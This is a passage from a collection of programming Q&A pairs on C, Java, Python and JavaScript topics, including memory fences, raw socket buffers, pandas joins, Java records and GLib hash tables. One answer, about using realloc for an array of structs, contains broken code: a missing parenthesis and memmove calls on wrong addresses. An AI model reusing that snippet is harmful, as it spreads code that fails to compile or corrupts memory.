 * Add one here, and similarly in smp_rmb() and smp_read_barrier_depends().
 */

I haven't used __atomic_thread_fence before, but my searches on the net show that __atomic_thread_fence prevents both compiler and CPU from reordering memory access. For example, its reference page here and here doesn't say it's only a CPU barrier. And an answer here says explicitly that it's both a compiler barrier and CPU barrier.
Does that mean barrier() in those definitions is redundant? (I'm just curious)
","It's redundant for smp_mb: __atomic_thread_fence(__ATOMIC_SEQ_CST); doesn't let any operations reorder in either direction.  But does no harm so might as well leave it in for consistency.
It's not redundant with RELEASE or ACQUIRE fences.  On paper, even ACQ_REL fences allow reordering earlier stores with later loads (StoreLoad).  So the compiler is allowed to do that at compile time, as well as not emitting instructions to stop it from happening at run-time.
But the Linux kernel's definitions of smp_rmb() and smp_wmb() are in terms of asm(""..."" ::: ""memory"") GNU C inline asm which blocks all compile-time reordering.
Linux barrier() is defined as asm("""" ::: ""memory"").

In practice, GCC probably treats any __atomic_thread_fence as a full compiler barrier; see Does gcc treat relaxed atomic operation as a Compiler-fence? - GCC currently won't even optimize increment of the same variable before and after a relaxed operation.  But Clang will optimize.
Practical demo of the difference
int read_twice(int* x) {
  int tmp = *x;
    //barrier();
    __atomic_thread_fence(__ATOMIC_RELEASE); // Doesn't block LoadLoad
  tmp += *x;
  return tmp;
}

The latest GCC loads twice.
Clang correctly optimizes it to a single load without barrier(), but can't with it.  (Godbolt)
# x86-64 clang 19, NO barrier()
read_twice(int*):
        mov     eax, dword ptr [rdi]
        add     eax, eax
        ret

# x86-64 clang 19, WITH barrier()
read_twice_barrier(int*):
        mov     eax, dword ptr [rdi]
        add     eax, dword ptr [rdi]
        ret

Obviously this is a silly example where the barrier makes no sense, but keep in mind that optimizations are possible after inlining small functions.
Code that would break without barrier() is probably already unsafe, e.g. probably using non-atomic (and non-volatile) accesses to shared variables without synchronization.  In code that uses fences properly (and/or atomic loads with appropriate memory orders), optimizations allowed without barrier() will still be safe.
See also Who's afraid of a big bad optimizing compiler? re: the perils of plain accesses to shared data: as well as the obvious pitfalls, there can be subtle effects like invented loads where a temporary is optimized away and the compiler reloads the shared data.
But anyway, for full belt-and-suspenders strict compatibility with the Linux kernel smp_* memory barrier functions, blocking all compile-time reordering across them is correct.

Related:

https://preshing.com/20130922/acquire-and-release-fences/  excellent easy-to-read explanation of acquire and release fences.  See also acq and rel semantics for operations (like load or store). And a followup article about fences - unlike operations, an acquire fence is a 2-way barrier for loads, for example, otherwise it couldn't work.

https://gcc.gnu.org/onlinedocs/gcc/_005f_005fatomic-Builtins.html#index-_005f_005fatomic_005fthread_005ffence - GCC's __atomic builtins are intended to implement the behaviour of the corresponding C++ std::atomic and C stdatomic functions, but do have their own documentation.  (Which doesn't shed any light on things in this case, except for the fact that it doesn't document them as full barriers to compile-time reordering.  So it's not safe to assume that.)

Who's afraid of a big bad optimizing compiler?


",c
is a kotlin liferay portlet possible,"As I couldn't find any example for this I am wondering if it is possible to create a Liferay Portlet which uses (pure) Kotlin instead of traditional Java.
","Kotlin targets the JVM - so technically: Yes. 
Will anybody be able to help you doing so, share their findings: Probably not. 
Do common build processes exist? Not that I know.
And it'll probably make a difference if you write a portlet for Liferay 6.2 or for 7 - unless you're aiming at just the standard JSR286 portlet.
This is a little bit like PHP-portlets in a Java Portal. It can be done, but once you run into the first issue, you'll have a hard time finding anyone to help you identify (or fix) the problem.
",java
is it possible to keep an entire array in cpu register,"In below code, 
int main( )
{
    register int arr[4];
    /* ... */
}

Is it possible that 'arr' is allocated in some cpu register.
(Consider cpu has 4 or more registers).
Or compiler will ignore register storage class for array.
","As per my understanding, answer is YES and NO.
NO because,

Any array element must be explicitly addressable (i.e. for eg. for 16 bit uC/uP its address should always lie between 0x0000 to 0xFFFF address space.)
CPU registers are accessed using register direct addressing mode ( such as mov r2,#100 ).
This addressing mode does not have an effective address. ( even it is not considered to be an addressing mode )
Array elements must reside in continous memory locations. ( for pointer arithmetic, the main reason to use array )

and YES because,

Compiler can allocate register for above array, so that we can perform some limited operations on it.
But operations which internally uses address for optimizations can't be used.

See below code.
int main( )
{
  register int arr[4];
  int i;

  arr[0] = 10;      /* OK */
  arr[1] = 20;      /* OK */
  arr[2] = 30;      /* OK */
  arr[3] = 40;      /* OK */

  for(i=0;i<4;i++)
    arr[i]=10;    /* Error : ""address of register variable 'arr' requested"" */

  return 0;
}

So my final conclusion is that, ideally register storage class should never be used with array even if your compiler permits it.
Please correct me or give more inputs. :-)
",c
joining with condition in pandas like in sql on clause,"I want to write the below type of query in Python. But basic python filtering acts like I did use WHERE clause in SQL, not ON for filtering. Could anyone please help? Appreciate for your support.
select * 
from t1 
left join t2 on  t1.key = t2.key 
             and t2.x2 <= t1.x 
             and t2.y2 > t1.y

I tried the below Python code, and it is not working same with SQL query.
df = t1.merge(t2, how = 'left', on = 'key')
df = df[df[x2] <= df[x]]
df = df[df[y2] > df[y]]

","Merge the dataframes, then check which locs does not match the condition, then set those locs as NaN.
While converting to NaN the datatype becomes float, so you might need to convert them to integer.
t1_data = {'key': [1, 2, 3, 4],
           'x': [5, 6, 7, 8],
           'y': [10, 11, 12, 13]}
t2_data = {'key': [2, 3, 4],
           'x2': [6, 7, 8],
           'y2': [16, 17, 18]}

t1 = pd.DataFrame(t1_data)
t2 = pd.DataFrame(t2_data)

merged = pd.merge(t1, t2, on='key', how='left')
condition = (merged['x2'] <= merged['x']) & (merged['y2'] > merged['y'])

# This identifies the rows which does not satisfy the condition, and then set x2 and y2 to NaN 
merged.loc[~condition & merged['y2'].notna(), ['x2', 'y2']] = pd.NA

Pandas Output
   key  x   y   x2    y2
0    1  5  10  NaN   NaN
1    2  6  11  6.0  16.0
2    3  7  12  7.0  17.0
3    4  8  13  8.0  18.0

The output with SQL matches with the Pandas output.
Fiddle
SQL Output
key x   y   x2      y2
1   5   10  null    null
2   6   11  6       16
3   7   12  7       17
4   8   13  8       18

",python
raw socket buffer,"When we using a raw socket, we need to handle everything including handling which packet we need to process.
Suppose i receive 2 packet with 10 byte size.
The packet contains message helloworld and helooworld.
Suppose helloworld packet is the first packet I'm receive from the network, and we know that the helloworld packet will be placed into the buffer.
But before I'm proccessing the helloworld packet, I'm receive helooworld packet.
Is there any overwritten data in the buffer?
Example code :
struct sockaddr _addr;
socklen_t size = sizeof(_addr);
unsigned char buffer[20];
int fd = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
recvfrom(fd,buffer,sizeof(buffer),0,&_addr,&size);

My question is :
When I'm receive the helloworld packet, the helloworld packet will be placed at the index 0-9, but before I'm proccessing the helloworld packet then i'm also receive the helooworld packet
Will helooworld packet be placed in index 0-9? And that means it will overwrite the previous data or be placed in index 10-19?
","In the context of raw sockets and the code example provided, each call to recvfrom will overwrite the contents of the buffer from the start (index 0), assuming the buffer size is sufficient to hold the received data.
To avoid losing data:

Process the received data immediately after calling recvfrom.
Separate Buffers: If you want to keep multiple packets, you need to copy the received data to a separate buffer before calling recvfrom again or you need to pass different buffers to recvfrom

",c
how to make group by in django orm,"I've an Order model as below:
class Order(models.Model):
    bill = models.ForeignKey(Bill, on_delete=models.PROTECT, null=True, blank=True)
    address_from = models.ForeignKey(Address, on_delete=models.PROTECT)
    address_to = models.ForeignKey(Address, on_delete=models.PROTECT)

How can I group a queryset from it and iterate in each group like the following:
bill = models.Bill.objects.get(pk=1)
groups = models.Order.objects.all().group_by('address_from', 'address_to')

for group in groups:
    group.update(bill = bill)

The point is to assign a specific Bill instance for each group of the orders that have the same address from and address to.
","I've solved this problem by combining the address from & address to primary keys into annotated unique key - uk - field and filter each uk.
from django.db.models import CharField, Value
from django.db.models.functions import Concat

orders = models.Order.objects.annotate(
    addresses_uk=Concat('address_from__pk', Value('-'), 'address_to__pk',
        output_field=CharField())
    )

for uk in set(orders.values_list('addresses_uk', flat=True)):
    bill = models.Bill.objects.create(
        address_from=models.Address.objects.get(pk=int(uk.split(""-"")[0])),
        address_to=models.Address.objects.get(pk=int(uk.split(""-"")[1]))
    )
    orders.filter(addresses_uk=uk).update(bill=bill)

",python
is the ordering of pathlib39s glob method consistent between runs,"Will Path('.').glob('*.ext') produce consistent ordering of results (assuming the files being globbed don't change)?
It seems the glob ordering is based on the file system order (at least, for the old glob package). Will pathlib's glob order be changed by adding files to the directory (which will not be included in the glob)? Will this order be changed by the file system even if nothing is added to the specific directory (e.g., when other large file changes are made elsewhere on the system)? Over the course of several days? Or will the ordering remain consistent in all these cases?
Just to clarify, I can't simple convert to a list and sort as there are too many file paths to fit into memory simultaneously. I'm hoping to achieve the same order each time as I will be doing some ML training, and want to set aside every nth file as validation data. This training will take several days, which is why I'm interested to know if the order remains stable over long times on the file system.
","Checking the source code for the pathlib module, by chance, the latest commit points us directly to the relevant place:

Use os.scandir() as context manager in Path.glob().

So under the hood Path.glob uses os.scandir to get the directory entries. The docs of this function report that the results are unordered:

Return an iterator of os.DirEntry objects corresponding to the entries in the directory given by path. The entries are yielded in arbitrary order, and the special entries '.' and '..' are not included.

(emphasis mine)
",python
navigating the file system with netbeans is very slow,"Since a few days, navigating the file system with Netbeans is VERY slow (more than two minutes to access a file, and if you have to navigate a file system, it is true every time. I have exactly the same problem after clearing the cache, and with Netbeans 8.2 and Netbeans 12 (Netbeans 8 with Java 8, and Netbeans 12 with Java 17 in my tests).
Strangely I don't have the same problem with regular Java file choosers which I use in my projects. For example, if I click on ""Open Project"", the IDE is frozen for sometimes 2 or 3 minutes before I can see the file navigator.
When I am looking in the task manager while trying to open a project for example, it appear that Network usage is very low (1% to 0%), CPU also very low (less than 2%)
I am talking about Netbeans itself, for example if I want to open an existing project, or adding a jar file to the list of Jar libraries for an existing project
The standard Swing JFileChooser works correctly. With this example code the navigation is immediate (as expected):
JFileChooser chooser = new JFileChooser();            
chooser.setDialogType(JFileChooser.OPEN_DIALOG);         
chooser.setDialogTitle(""Test FileChooser"");  
chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);         
int ret = chooser.showOpenDialog(null);         
if (ret == JFileChooser.APPROVE_OPTION{ 
   System.out.println(chooser.getSelectedFile().getAbsolutePath());        
}

I am on Windows, on my workplace network (I am working on local files on my PC, but there are two remote drives which are accessible on the network). I only have problems with Netbeans, other apps have no problem with the file system.
My problem is with Netbeans itself navigating the file system (for example opening an existing project, or adding a jar file as a library for a project)
This looks to behave exactly as this bug: https://bz.apache.org/netbeans/show_bug.cgi?id=42079, except that it does not happen with the Swing JFileChooser as shown above.
Is it a known problem, and if it is, is there a mean to fix it? I was thinking for example about a setting on the command line used to start Netbeans.
","In my case the guilty one was my enterprise AntiVirus (Trend Micro Apex).
Unloading it, ended the slowness immediately.
For the record I was Using Netbeans 19 with the JVM 17.08 on Windows 11.
",java
performance of unsigned vs signed integers,"Is there any performance gain/loss by using unsigned integers over signed integers?
If so, does this goes for short and long as well?
","Division by powers of 2 is faster with unsigned int, because it can be optimized into a single shift instruction. With signed int, it usually requires more machine instructions, because division rounds towards zero, but shifting to the right rounds down. Example:
int foo(int x, unsigned y)
{
    x /= 8;
    y /= 8;
    return x + y;
}

Here is the relevant x part (signed division):
movl 8(%ebp), %eax
leal 7(%eax), %edx
testl %eax, %eax
cmovs %edx, %eax
sarl $3, %eax

And here is the relevant y part (unsigned division):
movl 12(%ebp), %edx
shrl $3, %edx

",c
how to change version of python in pycharm,"I wanted to make Discord bot (should I even write this here), but it's said that I need Python 3.6, not Python 3.7 that I have.
How can I change from Python 3.7 to Python 3.6 to make something like that ? 
","First make sure you have Python 3.6 installed.
Then Go to File > Settings > Project:* > Project Interpreter, then select your interpreter under the Project Interpreter drop down.
If its still not there, you can also press the settings cog button  on the right side of the drop down and select add. Select System Interpreter from the left side, then select the interpreter from there. When you press ok, the interpreter will be available to be selected.
",python
extract ip and uag from cloudflare cdncgitrace text result using regex in js,"Hi I am planning to use Cloudflare cdn-cgi trace service to get clients IP and User Agent results. If I fetch this link: https://www.cloudflare.com/cdn-cgi/trace, the result I am getting is in a text format.
Result text example:
fl=47f54
h=www.cloudflare.com
ip=11.111.11.11
ts=1597428248.652
visit_scheme=https
uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
colo=OH
http=http/2
loc=US
tls=TLSv1.3
sni=plaintext
warp=off

I did some research and figured out I need to use Regex? But not sure how to extract only the ip and uag from the result.
...
ip=11.111.11.11
...
uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
...

How do I just extract the result 11.111.11.11 (ip changes for all client) and Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 (uag or user agent changes for all client) from the above text for each result I fetch?
","You may try:
^(?:ip|uag)=(.*)$

Explanation of the above regex:

^, $ - Represents start and end of the line respectively.
(?:ip|uag) - Represents a non-capturing group matching either ip or uag literally.
= - Represents = literally.
(.*) - Represents first caturing group matching anything zero or more time which is preceded by ip= or uag=.

You can find the demo of the above regex in here.


const myRegexp = /^(?:ip|uag)=(.*)$/gm;
const myString = `fl=47f54
h=www.cloudflare.com
ip=11.111.11.11
ts=1597428248.652
visit_scheme=https
uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
colo=OH
http=http/2
loc=US
tls=TLSv1.3
sni=plaintext
warp=off`;
let match;

let resultString = """";
match = myRegexp.exec(myString);
while (match != null) {
  resultString = resultString.concat(match[1] + ""\n"");
  match = myRegexp.exec(myString);
}
console.log(resultString);




2nd approach:


const myString = `fl=47f54
h=www.cloudflare.com
ip=11.111.11.11
ts=1597428248.652
visit_scheme=https
uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
colo=OH
http=http/2
loc=US
tls=TLSv1.3
sni=plaintext
warp=off`;
// Split on new line filter on the condition that element starts with ip or uag and join
console.log(myString.split(""\n"").filter(el => el.startsWith(""ip"") || el.startsWith(""uag"")).join('\n'));



",javascript
it is more efficient to use ifreturnreturn or ifelsereturn,"Suppose I have an if statement with a return. From the efficiency perspective, should I use
if(A > B):
    return A+1
return A-1

or
if(A > B):
    return A+1
else:
    return A-1

Should I prefer one or another when using a compiled language (C) or a scripted one (Python)?
","Since the return statement terminates the execution of the current function, the two forms are equivalent (although the second one is arguably more readable than the first).
The efficiency of both forms is comparable, the underlying machine code has to perform a jump if the if condition is false anyway.
Note that Python supports a syntax that allows you to use only one return statement in your case:
return A+1 if A > B else A-1

",python
all possible combinations of a 2d array in javascript,"So I have a variable length array filled with variable length arrays. Something like this for example:
var arr2d = [
    ['red', 'blue'],
    ['cotton','polyester','silk'],
    ['large','medium','small']
]

I am trying to get all possible combinations of one from each array. so the answer should look something like this:
var answer = [
    ['red', 'cotton', 'large'],
    ['red', 'cotton', 'medium'],
    ['red', 'cotton', 'small'],
    ['red', 'polyester', 'large'],
    .
    .
    .
]

I've looked into the other answer on this topic but all of them are in java (I need javascript) and they were looking for all combinations and not limited to the combinations of length === arr2d.length. I've looked at this for almost 2 hours and still I cannot think of a way to do this recursively. It's one of those head explosion scenarios because both the arrays vary in length (I have an array of these 2d arrays that I must get the combinations for). In the example I've laid out there are only 18 possiblities, but in practice it could be thousands.
","Another option when using recursive functions is to maintain your state in the arguments of the function. This can sometimes make the function easier to understand:


var arr2d = [['red', 'blue'],['cotton','polyester','silk'],['large','medium','small']]_x000D_
_x000D_
function combos(list, n = 0, result = [], current = []){_x000D_
    if (n === list.length) result.push(current)_x000D_
    else list[n].forEach(item => combos(list, n+1, result, [...current, item]))_x000D_
 _x000D_
    return result_x000D_
}_x000D_
_x000D_
console.log(combos(arr2d))



",javascript
using realloc for high performance with an array of structs,"I am using realloc to adjust the size of an array of structs containing 3 points x, y and z.  This struct is encapsulated inside another struct that contains the array, the length of the array and a ""reserved"" value that is used for a pre-allocation strategy for even faster performance when it is evident that more structs of points will be appended to the struct array.
I am compiling with a Makefile that looks like this:
CFLAGS = -g -Wall
LIBS = -lm

default: echo ""You must specify a target, e.g. file1, file2"" 


file2:
    gcc $(CFLAGS) -o $@ test.c file2.c $(LIBS)

I have a function to initialize an empty array structure, one to reset the array to be empty and free any dynamically allocated memory, one to append a point to the end of the array and one to remove a point designated by the index value.  
I am getting two errors that I cannot find the cause of.  One is that my code returns a non-zero status code of 1 and the other is the length seems to be off by one when I append a few thousand points.
I am letting the append function do all the work but if I should be allocating dynamic memory in initialization, please tell me so.  I am pretty sure that my reset and remove functions are working as they are supposed to.  Please take a look at append as well.  
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <math.h>
#include <assert.h>

typedef struct point
{
  int x, y, z;
} point_t;

typedef struct 
{
  // number of points in the array
  size_t len;

  // pointer to an array of point_t structs

  point_t* points;


  size_t reserved; 

} point_array_t;


void point_array_initial( point_array_t* pa )
{
    assert(pa);
    pa->len = 0;
    pa->reserved = 0;
    pa->points=NULL;
}   


void point_array_reset( point_array_t* pa )
{//just free the array and set pa to NULL

    assert(pa);

    pa->points = memset(pa->points, 0, sizeof(point_t)*(pa->len));
    pa->len = 0;
    pa->reserved=0;
    free(pa->points);
    pa->points=NULL;
}


int point_array_append( point_array_t* pa, point_t* p )
{

    assert(pa);
    assert(p);
    if(pa == NULL)//something wrong with intialization or reset
    {
        return 1;
    }
    if(p == NULL)//nothing to append
    {
        return 1;
    }
    //append the first point 
    if(pa->len == 0)
    {
        pa->len=1;
        pa->reserved=pa->len*2;
        pa->points = malloc(sizeof(point_t)* (pa->reserved));
        if(pa->points == NULL)//malloc failed
        {
            return 1;
        }

        pa->points[pa->len-1].x = p->x;
        pa->points[pa->len-1].y = p->y;
        pa->points[pa->len-1].z = p->z;
    }

    if (pa->reserved > pa->len )
    {
        pa->len+=1;
        pa->points[pa->len-1].x = p->x;//insert at index 0
        pa->points[pa->len-1].y = p->y;
        pa->points[pa->len-1].z = p->z;

    }
    //when we run out of space in reserved (len has caught up)
    else if(pa->reserved == pa->len)
    {
        pa->len+=1;
        pa->reserved=pa->len*2;
        pa->points=realloc(pa->points, sizeof(point_t)*(pa->reserved));//doubling size of array
        pa->points[pa->len-1].x = p->x;//TODO: change formula to find insertion point
        pa->points[pa->len-1].y = p->y;
        pa->points[pa->len-1].z = p->z;
    }



    return 0;
}


int point_array_remove( point_array_t* pa, unsigned int i )
{

    assert(pa);
    if (i >= pa->len)//out of bounds
    {
        return 1;
    }   

    if(pa->len==0)//0 elements trying to remove from empty array
    {
        //pa->len=0;
        //free(pa->points);
        //pa->points=NULL; 
        return 1;
    }
    else if(pa->len ==1)//remove only element
    {
        pa->len-=1;//no copying required, just shorten
        pa->points=realloc(pa->points, sizeof(point_t)*(pa->len));
        //free(pa->points);
        //pa->points=NULL;
    }
    else//array size is longer than 1 or 0
    {
        pa->points[i].x = pa->points[pa->len-1].x;
        pa->points[i].y = pa->points[pa->len-1].y;
        pa->points[i].z = pa->points[pa->len-1].z;  
        pa->len-= 1;//shorten array size
        pa->reserved = pa->len*2;
        pa->points=realloc(pa->points, sizeof(point_t)*(pa->len));//could reallocate for reserve here to increase speed.
    }   

    return 0;
}

","an else is missing after the if(pa->len == 0) body in the append function: the first point is appended twice.
Note that you have too many special cases in this function. It can be simplified into just a one test: if the array is too small, reallocate it, and append the point.
Other simplifications are possible:

the test if (pa->len == 0)//0 elements trying to remove from empty array is redundant with the previous one.
take advantage of the fact that realloc(NULL, size) is equivalent to malloc(size) and realloc(p, 0) to free(p), and free(NULL) is OK.
beware that realloc() may fail, even when shrinking the block.
you should only shrink the array when it becomes too sparse, not for every call to point_array_remove.

Here is a simpler version:
#include <assert.h>
#include <stdlib.h>

typedef struct point {
    int x, y, z;
} point_t;

typedef struct {
    size_t len;      // number of valid points in the array
    size_t reserved; // allocated number of points in the array
    point_t *points; // pointer to an array of point_t structs
} point_array_t;

void point_array_initial(point_array_t *pa) {
    assert(pa);
    pa->len = 0;
    pa->reserved = 0;
    pa->points = NULL;
}

void point_array_reset(point_array_t *pa) {
    assert(pa);
    free(pa->points);
    pa->len = 0;
    pa->reserved = 0;
    pa->points = NULL;
}

int point_array_append(point_array_t *pa, const point_t *p) {
    point_t *points;

    assert(pa);
    assert(p);
    // no need to test pa nor p, asserts would already abort
    points = pa->points;
    if (pa->len >= pa->reserved || points == NULL) {
        // reallocate of points array is too small
        size_t newsize = pa->reserved;
        if (newsize < pa->len)
            newsize = pa->len;
        if (newsize < 1)
            newsize = 1;
        newsize += newsize;
        points = realloc(points, newsize * sizeof(*points);
        if (points == NULL)
            return 1;
        pa->points = points;
        pa->reserved = newsize;
    }
    // append point structure
    points[pa->len++] = *p;
    return 0;
}

int point_array_remove(point_array_t *pa, unsigned int i) {
    point_t *points;

    assert(pa);
    if (i >= pa->len || pa->points == NULL) { //out of bounds or invalid array
        return 1;
    }
    if (pa->len - i > 1) {
        memmove(&pa->points + i, &pa->points + i + 1,
                sizeof(*pa->points) * (pa->len - i - 1));
    }
    pa->len--;
    if (pa->reserved >= pa->len * 3) {
        size_t newsize = pa->len * 2;
        // shorten the array with care.
        // note that the array will be freed when it becomes empty
        // no special case needed.
        points = realloc(pa->points, sizeof(*points) * newsize);
        if (points != NULL) {
            pa->points = points;
            pa->reserved = newsize;
        }
    }
    return 0;
}

",c
modification of random forest to always evaluate some features at every split,"I am trying to change the functionality of a random forest classifier. While usually features are selected at random for each split, I want one specific feature to be evaluated at each split. I know this can impact performance but i want to try out whether this is a good idea in a very specific use case. So the result of the adaptation shall be: features used for splitting are selected at random (as usual) but one specific feature (say index 15) is always considered (not necessarily used).
I don't know any packages that allow that out of the box. It's there one, or maybe a simple workaround to achieve the same effect?
","The {ranger} package offers this option via always.split.variables. The package is very fast as well.
",c
java record custom constructor,"I have a java record that takes in a list
public record Zoo(List<Animal> animals ) {

     public Zoo(Collection<Animal> animals) {
         this(new ArrayList<>(animals));
     }

     ...
}

However, the animals are not in sorted order, and I want to create record where animals are sorted. Is this possible in Java record?
In plain java class, I could have
public class Zoo {
   ...
   public Zoo(List<Animal> animals) {
     this.animals = animals.sort(someComparator);
   } 

}

","You can do the same as with your ""plain Java class"".
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.List;

public record Zoo(List<Animal> animals) {

  /*
   * The canonical constructor copies the 'animals' list so that both
   * constructors have consistent behavior (i.e. they both always result
   * in the list being copied). Plus, since you want to sort the list, it's
   * a good idea to create a copy anyway to avoid side-effects.
   *
   * FIXME: Avoid double-copy when using non-canonical constructor.
   *
   *        When the non-canonical constructor is called with a collection
   *        other than a list, the collection will be copied twice. This
   *        appears to be unavoidable, but if anyone can think of a solution
   *        then please let me know.
   */

  // explicit canonical constructor (parameters can be omitted)
  public Zoo {
    animals = new ArrayList<>(animals);
    animals.sort(/* TODO: Pass comparator */);
    // records should typically be immutable
    animals = Collections.unmodifiableList(animals);
  }

  // a non-canonical constructor (must delegate to canonical constructor)
  public Zoo(Collection<Animal> animals) {
    // avoid double-copy if 'animals' is already a List
    this(animals instanceof List<Animal> list ? list : new ArrayList<>(animals));
  }
}

The first constructor is an explicit declaration of the (compact1) canonical constructor. From the documentation of java.lang.Record:

A record class has the following mandated members: a canonical constructor, which must provide at least as much access as the record class and whose descriptor is the same as the record descriptor; a private final field corresponding to each component, whose name and type are the same as that of the component; a public accessor method corresponding to each component, whose name and return type are the same as that of the component. If not explicitly declared in the body of the record, implicit implementations for these members are provided.
[...]
The primary reasons to provide an explicit declaration for the canonical constructor or accessor methods are to validate constructor arguments, perform defensive copies on mutable components, or normalize groups of components (such as reducing a rational number to lowest terms.)

Note all other constructors must eventually delegate to the canonical constructor.

1. See §8.10.4.2. Compact Canonical Constructors of the Java Language Specification.
",java
gudhi python library did not show the output for dimension 1,"The following code is for ""Homology Groups"". I used library for implementation purpose.
import gudhi

# Create a simplicial complex
simplex_tree = gudhi.SimplexTree()
simplex_tree.insert([1, 2, 3])
simplex_tree.insert([2, 3, 4])
simplex_tree.insert([3, 4, 5])

# Compute homology
homology = simplex_tree.persistence()

print(""Homology groups:"")
for interval in homology:
    dim, (birth, death) = interval
    print(f""Dimension {dim}: birth = {birth}, death = {death}"")

The output I get
Homology groups:
Dimension 0: birth = 0.0, death = inf

Why I did not get the output for Dimension 1?
","The reason is:
As defined in the code, there are no non-trivial 1-dimensional loops.
if there is no 1-d features that presist by homology
e.g.
a loop like 1>2>3>1 exists but it is filled by triangle so it does not contribute to the first homology group H1
I hope you will get the point, otherwise you can ask for further clarification and I will further explain
try these lines in your code as well to loop and print the H1 I hope it will work for you :)
print(""Homology groups:"")
for interval in 
 simplex_tree.persistence_intervals_in_dimension(0):
 print(f""Dimension 0: birth = {interval[0]}, death = 
 {interval[1]}"")

for interval in 
 simplex_tree.persistence_intervals_in_dimension(1):
 print(f""Dimension 1: birth = {interval[0]}, death = 
 {interval[1]}"")

",python
is there a difference between single and double quotes in java,"Is there a difference between single and double quotes in Java?
","Use single quotes for literal chars, double quotes for string literals, like so:
char c = 'a';
String s = ""hello"";

They cannot be used any other way around (like in Python, for example).
",java
what does prototypeconstructor do,"Suppose we have this constructor:
var Foo = function(){
   this.x = ""y"";
}

Foo and Foo.prototype.constructor evaluate to the same function, yet Foo.prototype.constructor = function(){this.x=""z""} doesn't seem to change the result of new Foo().  It does however change the result of 
var i = new Foo();
i.constructor; // evals to function (){this.x = ""z""}

What's going on here?  I don't plan on using this for anything, I'm just curious about the language.
","The constructor property of the prototype property of a function is meant to point back to the function so that you can ask an object what constructed it. It's set up automatically as part of creating the function object (See Section 13.2 of the spec [or here for a more up-to-date version].) As you've seen, you can override the constructor property on the Foo.prototype if you like, to change that, but by default that's what it's for. For years the JavaScript specification only said that the constructor property would be there and have a given default value (function Foo() { } will mean that, by default, Foo.prototype.constructor is Foo.). But starting in ES2015, that changed, and various operations in the specification now actually use the constructor property, such as here, here, here, and here.
(Note that the following was written before ES2015's class feature was added. The below is how you'd do this in ES5 and earlier. In ES2015+, if you're doing constructor functions and inheritance hierarchies, there's no good reason to do the below; just use class. [If you don't use constructor functions to build inheritance hierarchies — and you don't have to, there are other ways to do them in JavaScript — you wouldn't do the below or use class.])
There's a good reason you can override it, which relates to inheritance. Suppose you want to have a Base constructor that creates base objects, and a Derived constructor that creates derived objects with the features of Base plus the additions/modifications of Derived. The usual (though not to my mind ideal) way you see that done (absent helper scripts) is:
function Base() {
}
Base.prototype.foo = function() {
    console.log(""I'm Base#foo"");
};

function Derived() {
}
Derived.prototype = new Base(); // So we get all the `Base` stuff
Derived.prototype.bar = function() {
    console.log(""I'm Derived#bar"");
};

var d = new Derived();
d.foo(); // ""I'm Base#foo""
d.bar(); // ""I'm Derived#bar""

The problem is that now, d.constructor === Base rather than Derived. So being able to fix that is important:
...
Derived.prototype = new Base();                           // So we get all the `Base` stuff
Object.defineProperty(Derived.prototype, ""constructor"", { // Fix up
    value: Derived,
    writable: true,
    configurable: true
});
...

(Side note: All of this plumbing — and complexity around supercalls — is why ES2015+ have class syntax.)

Note that the above is not meant to be an ideal way to set up inheritance hierarchies. It's what you usually see, but as I said above, not ideal. Just for completeness, in an environment limited to ES5 syntax, this is better:
function Base() {
}
Base.prototype.foo = function() {
    console.log(""I'm Base#foo"");
};

function Derived() {
    Base.call(this); // So Base sets up its stuff
}
Derived.prototype = Object.create(Base.prototype); // So we get all the `Base` stuff
Object.defineProperty(Derived.prototype, ""constructor"", {
    value: Derived,
    writable: true,
    configurable: true
});
Derived.prototype.bar = function() {
    console.log(""I'm Derived#bar"");
};

var d = new Derived();
d.foo(); // ""I'm Base#foo""
d.bar(); // ""I'm Derived#bar"" 

...where in a pre-ES5 environment, you use a shim/polyfill for Object.create. But again, I don't do this directly (and don't recommend it), I use helper scripts so it's declarative and repeatable.
",javascript
how can i get the first key that matches a given value in a ghashtable in c,"I'm writing some C code using GLib and using GHashTable to store some data. However, sometimes I need to do a ""reverse lookup"" where I need to find the first key that matches a given value. I tried looking through the documentation for GHashTable, but I couldn't find anything like this. Initially, I was hopeful that g_hash_table_find () could do this, but it only returns the value of the key/value pair, so it can't do what I'm asking for.
How can I get the first key that matches a given value in a GHashTable? The definition of ""first"" doesn't really matter as all values should be unique in my case.
","I ended up implementing this using GHashTableIter:
gpointer key = NULL, value = NULL;
gchar *matching_key = NULL;
GHashTableIter iter;

g_hash_table_iter_init (&iter, hash_table);
while (g_hash_table_iter_next (&iter, &key, &value)) {
  if (g_str_equal (value, value_to_match)) {
    matching_key = key;
    break;
  }
}

where hash_table is the GHashTable to search through, and value_to_match is the value to find. In this case, the value is a gchar *, so you'd need to change some types and use a different equality function if you want to compare some other kind of data. Additionally, you'll want to check if matching_key is NULL to see if you actually found a match.
",c
multiple java versions running concurrently under windows,"We have a couple of applications running on Java 5 and would like now to bring in an application based on Java 6. Can both java versions live together under Windows? 
Is there any control panel to set the appropriate Java version for different applications, or any other way to set up, what version of Java will be used to run that particular application?
","Of course you can use multiple versions of Java under Windows. And different applications can use different Java versions. How is your application started? Usually you will have a batch file where there is something like  
java ...

This will search the Java executable using the PATH variable. So if Java 5 is first on the PATH, you will have problems running a Java 6 application. You should then modify the batch file to use a certain Java version e.g. by defining a environment variable JAVA6HOME with the value C:\java\java6 (if Java 6 is installed in this directory) and change the batch file calling
%JAVA6HOME%\bin\java ...

",java
enablefeignclients and feignclient fail on autowiring 39feigncontext39 nosuchbeanexception,"The microservice I'm writting needs to communicate to other microservices in our platform. On that attempt, the ideal solution for us is Spring Cloud Netflix Feign, implemeting a @FeignClient.
